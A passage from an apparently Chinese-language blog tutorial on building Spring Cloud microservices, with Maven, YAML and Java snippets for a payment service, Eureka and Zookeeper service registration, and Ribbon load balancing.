class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    	<span class="comment">&lt;!--添加boot自动配置，一定要添加不然@SpringBootApplication注解无效--&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-autoconfigure<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>application.yml</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-payment-service</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.alibaba.druid.pool.DruidDataSource</span></span><br><span class="line">    <span class="comment"># 当前数据源操作类型</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.alibaba.druid.proxy.DruidDriver</span></span><br><span class="line">    <span class="comment"># mysql驱动包</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/db2019?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mapper/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.tosang.springcloud.entities</span> <span class="comment">#所有Entity别名类所在包</span></span><br></pre></td></tr></table></figure><blockquote><p>启动类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.springcloud;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentMain8001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(PaymentMain8001<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>业务类——SQL</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建表，注意``和''的区别</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`payment`</span>(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">BIGINT</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'ID'</span>,</span><br><span class="line"><span class="string">`serial`</span> <span class="built_in">VARCHAR</span>(<span class="number">200</span>) <span class="keyword">DEFAULT</span> <span class="string">''</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span>(<span class="string">`id`</span>)</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">1</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br></pre></td></tr></table></figure><blockquote><p>controller，dao，entities，service，mapper各层目录结构如下</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200708082150124.png" alt="image-20200708082150124"></p><blockquote><p>注意：子模块可能无法调用父模块的依赖（由于maven在IDEA2020下的抽风），尤其是可以尝试手动添加mysql-connector-java的maven依赖，并且需要注意驱动版本和mysql匹配以及mysql的ssh是否关闭。</p></blockquote><h5 id="消费者模块：cloud-consumer-order80"><a href="#消费者模块：cloud-consumer-order80" class="headerlink" title="消费者模块：cloud-consumer-order80"></a>消费者模块：cloud-consumer-order80</h5><blockquote><p>restTemplate</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//三个参数：请求URL，发送的对象， 返回值类型</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.postForObject(PAYMENT_URL+</span><br><span class="line">                <span class="string">"/payment/create"</span>, payment, CommonResult<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure><h3 id="热部署Devtools"><a href="#热部署Devtools" class="headerlink" title="热部署Devtools"></a>热部署Devtools</h3><blockquote><p>Adding devtools to your 子模块project</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/ <span class="attr">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span> spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt; <span class="attr">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Adding plugin to your 父工程pom.xml</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>你自己的工程名字<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/ <span class="attr">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">fork</span>&gt;</span>true<span class="tag">&lt;/<span class="name">fork</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">addResources</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addResources</span>&gt;</span>|</span><br><span class="line">			<span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Enabling automatic build<br>Update the value of</p></blockquote><p>不过开启热部署，性能耗费会较大，不建议使用</p><h3 id="项目重构"><a href="#项目重构" class="headerlink" title="项目重构"></a>项目重构</h3><blockquote><p>实体类在子模块都是重用的，需要抽取出来作为公共类</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200710092249034.png" alt="image-20200710092249034"></p><h5 id="MAVEN打包"><a href="#MAVEN打包" class="headerlink" title="MAVEN打包"></a>MAVEN打包</h5><blockquote><p>这个地方是个大坑，建议如下</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#首先添加阿里云镜像，这一步相信大家都会</span><br><span class="line">（但是建议是先运行一次官方版本maven保证下载了maven插件再替换镜像，这取决于你的网络，很可能并不会一定成功）</span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#如果继续爆红，尝试指定java版本，这点非常关键</span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">			  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># maven插件抽风爆红困扰了我很久，指定java版本经我检测是很有效的办法</span><br></pre></td></tr></table></figure><p>一切就绪点击<code>maven install</code>即可</p><h5 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入自己定义的api通用包--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.tosang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Eureka服务注册与发现"><a href="#Eureka服务注册与发现" class="headerlink" title="Eureka服务注册与发现"></a>Eureka服务注册与发现</h3><blockquote><p>Eureka采用了CS的设计架构，<code>Eureka Server</code>作为服务注册功能的服务器，它是服务注册中心。而系统中的其他微服务,使用Eureka的客户端连接到Eureka Server并维持心跳连接。这样系统的维护人员就可以通过Eureka Server来监控系统中各个微服务是否正常运行。在服务注册与发现中，有一个注册中心。 当服务器启动的时候，会把当前自己服务器的信息比如服务地址通讯地址等以别名方式注册到注册中心上。另一方(消费者|服务提供者) ,以该别名的方式去注册中心上获取到实际的服务通讯地址，然后再实现本地RPC调用RPC远程调用框架核心设计思想:在于注册中心，因为使用注册中心管理每个服务与服务之间的一个依赖关系(服务治理概念)。在任何rpc远程框架中， 都会有一个<code>注册中心</code>(存放服务 地址相关信息(接口地址))</p></blockquote><h4 id="Eureka-Server"><a href="#Eureka-Server" class="headerlink" title="Eureka Server"></a>Eureka Server</h4><blockquote><p><code>Eureka Server</code>提供服务注册服务各个微服务节点通过配置启动后，会在EurekaServer中进行注册，这样EurekaServer中的服务注册表中将会存储所有可用服务节的信息,服务节点的信息可以在界面中直观看到。</p></blockquote><h4 id="EurekaClient"><a href="#EurekaClient" class="headerlink" title="EurekaClient"></a>EurekaClient</h4><blockquote><p><code>EurekaClient</code>通过注册中心进行访问，是一个Java客户端，用于简化Eureka Server的交互,客户端同时也具备一个内置的、 使用轮询(round-robin)负载算法的负载均衡器。在应用启动后,将会向Eureka Server发送心跳(默认周期为30秒。 如果Eureka Server在多个心跳周期内没有接收到某个节点的心跳，EurekaServer将会从服务注册表中把这个服务节点移除(默认90秒)</p></blockquote><h4 id="cloud-eureka-server8000"><a href="#cloud-eureka-server8000" class="headerlink" title="cloud-eureka-server8000"></a>cloud-eureka-server8000</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span>   <span class="comment">#服务端实例名称</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span> <span class="comment">#不注册自己</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span> <span class="comment">#自己是服务端不需要去检测服务</span></span><br><span class="line">    <span class="attr">service-url:</span>   <span class="comment">#默认是 "defaultZone", "http://localhost:8761/eureka/"</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8761/eureka/</span></span><br><span class="line"><span class="comment">#服务名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">eureka-server</span></span><br></pre></td></tr></table></figure><h3 id="Eureka集群"><a href="#Eureka集群" class="headerlink" title="Eureka集群"></a>Eureka集群</h3><blockquote><p>1先启动eureka注册中心<br>2启动服务提供者paymen支付服务<br>3支付服务启动后会把自身信息(比如服务地址以别名方式注<br>册进eureka)<br>4消费者order服务在需要调用接口时，使用服务别名去注册<br>中心获取实际的RPC远程调用地址<br>5消费者获得调用地址后，底层实际是利用<code>HttpClient</code>技术<br>,实现远程调用<br>6消费者获得服务地址后会缓存在<code>本地jvm内存</code>中，默认每间<br>隔30秒更新一次服务调用地址</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">### 集群下，多个server之间相互注册即可（defaultZone）</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">eureka7000.com</span>   <span class="comment">#服务端实例名称</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span> <span class="comment">#不注册自己</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span> <span class="comment">#自己是服务端不需要去检测服务</span></span><br><span class="line">    <span class="attr">service-url:</span>   <span class="comment">#默认是 "defaultZone", "http://localhost:8761/eureka/"</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka8000.com:8000/eureka/</span></span><br><span class="line"><span class="comment">#服务名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">eureka-server</span></span><br></pre></td></tr></table></figure><p>:star:默认情况下，Eureka集群之间会自动同步复制，也就是只需要注册一个注册中心即可。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200712110648512.png" alt="image-20200712110648512"></p><h3 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h3><h4 id="修改Order模块控制层"><a href="#修改Order模块控制层" class="headerlink" title="修改Order模块控制层"></a>修改Order模块控制层</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line">	<span class="comment">//以服务名访问，不再是ip</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PAYMENT_URL = <span class="string">"http://CLOUD-PAYMENT-SERVICE"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/consumer/payment/create"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">create</span><span class="params">(Payment payment)</span></span>&#123;</span><br><span class="line">        <span class="comment">//三个参数：请求URL，发送的对象， 返回值类型</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.postForObject(PAYMENT_URL+</span><br><span class="line">                <span class="string">"/payment/create"</span>, payment, CommonResult<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/consumer/payment/get/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult&lt;Payment&gt; <span class="title">getPayment</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Long id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(PAYMENT_URL+<span class="string">"/payment/get/"</span>+id,</span><br><span class="line">                CommonResult<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="添加负载均衡"><a href="#添加负载均衡" class="headerlink" title="添加负载均衡"></a>添加负载均衡</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span>   <span class="comment">//负载均衡</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RestTemplate <span class="title">getRestTemplate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Eureka自我保护机制"><a href="#Eureka自我保护机制" class="headerlink" title="Eureka自我保护机制"></a>Eureka自我保护机制</h3><p>默认情况下，如果EurekaServer在一定时间内没有接收到某 个微服务实例的心跳，EurekaServer将 会注销该实例(默认90秒)。但是当网络分区故障发生(延时、卡顿、拥挤)时,微服务与EurekaServer之间无法正常通信，以上行为可能变得非常危险了一因为微服务本身其实是健康的,此时本不应该注销这个微服务。Eureka通过”自我保护模式”来解决这个问题一-当EurekaServer节 点在短时间内丢失过多客户端时(可能发生了网络分区故障) , 那么这个节点就会进入自我保护模式。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">instance :</span></span><br><span class="line">    <span class="comment">#Eureka客户端向服务端发送心跳的时间间隔，单位为秒(默认是30秒)</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">1</span></span><br><span class="line">    <span class="comment">#Eureka服势端在收到最后一次心跳后等待时间上限，单位为秒( 默认是90秒)，超时将剔除服务</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="使用Zookeeper替代Eureka"><a href="#使用Zookeeper替代Eureka" class="headerlink" title="使用Zookeeper替代Eureka"></a>使用Zookeeper替代Eureka</h3><blockquote><p>POM导包</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SpringBoot整合Zookeeper客户端--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zookeeper-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	 <span class="comment">&lt;!--boot自动配置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-autoconfigure<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--lombok--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--导入公共API--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.tosang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML配置</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#8004表示注册到zookeeper服务器的支付服务提供者端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8004</span></span><br><span class="line"><span class="comment">#服务别名----注册zookeeper到注册中心名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-provider-payment</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper :</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.106</span><span class="string">:2181</span></span><br></pre></td></tr></table></figure><blockquote><p>启动项目后检测是否注册进zk，可以看到cloud-provider-payment入驻，通过<code>get</code>可以获取连接详情</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200714160236259.png" alt="image-20200714160236259"></p><h3 id="比较三个注册中心与CAP原则"><a href="#比较三个注册中心与CAP原则" class="headerlink" title="比较三个注册中心与CAP原则"></a>比较三个注册中心与CAP原则</h3><p>最多只能同时较好的满足两个。<br>CAP理论的核心是: 一个分布式系统不可能同时很好的满足致性， 可用性和分区容错性这三个需求,<br>因此，根据CAP原理将NoSQL数据库分成了满足CA原则、满足CP原则和满足AP原则三大类:<br>CA-单点集群，满足一致性,可用性的系统，通常在可扩展性上不太强大。<br>CP-满足一致性,分区容忍必的系统，通常性能不是特别高。<br>AP-满足可用性,分区容忍性的系统,通常可能对一致性要求低一些。</p><p><code>AP --- Eureka</code><br><code>CP --- Zookeeper/Consul</code></p><h3 id="Ribbon"><a href="#Ribbon" class="headerlink" title="Ribbon"></a>Ribbon</h3><blockquote><p>Spring Cloud Ribbon是基于Netlix Ribbon实现的一套<code>客户端负载均衡</code>的工具。Ribbon属于进程内LB。</p><p>新版netflix的eureka集成了Ribbon</p></blockquote><h4 id="RestTemplate补充"><a href="#RestTemplate补充" class="headerlink" title="RestTemplate补充"></a>RestTemplate补充</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200714174838728.png" alt="image-20200714174838728"></p><h4 id="Ribbon负载规则替换"><a href="#Ribbon负载规则替换" class="headerlink" title="Ribbon负载规则替换"></a>Ribbon负载规则替换</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//注意该类必须定义在不同于业务类所在包，否则会失效</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySelfRule</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IRule <span class="title">myRule</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RandomRule();<span class="comment">//定义为随机</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>主启动类添加RibbonClient</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="meta">@RibbonClient</span>(name = <span class="string">"CLOUD-PAYMENT-SERVICE"</span>, configuration = MySelfRule<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">OrderMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderMain80<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Ribbon的轮询算法底层使用了：CAS-自旋锁"><a 